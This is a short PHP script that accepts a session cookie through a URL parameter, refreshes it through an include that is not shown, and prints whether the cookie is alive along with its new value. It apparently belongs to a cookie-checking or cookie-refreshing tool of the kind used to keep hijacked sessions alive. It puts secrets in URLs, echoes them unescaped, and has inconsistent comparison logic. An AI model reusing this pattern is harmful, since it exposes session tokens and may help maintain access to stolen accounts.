<?php
include_once($_SERVER['DOCUMENT_ROOT'] . '/backend/include.php');

if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];

    $cooks = refresh($cookie);

    if ($cooks !== $cookie) {
        echo "<div style='color: green; font-weight: bold;'>Cookie is alive! <br> Refreshed: " . $cooks['cookie'] . "</div>";
    } else {
        echo "<div style='color: red; font-weight: bold;'>Cookie is dead!</div>";
    }
} else {
    echo "<div style='color: orange; font-weight: bold;'>Cookie is missing!</div>";
}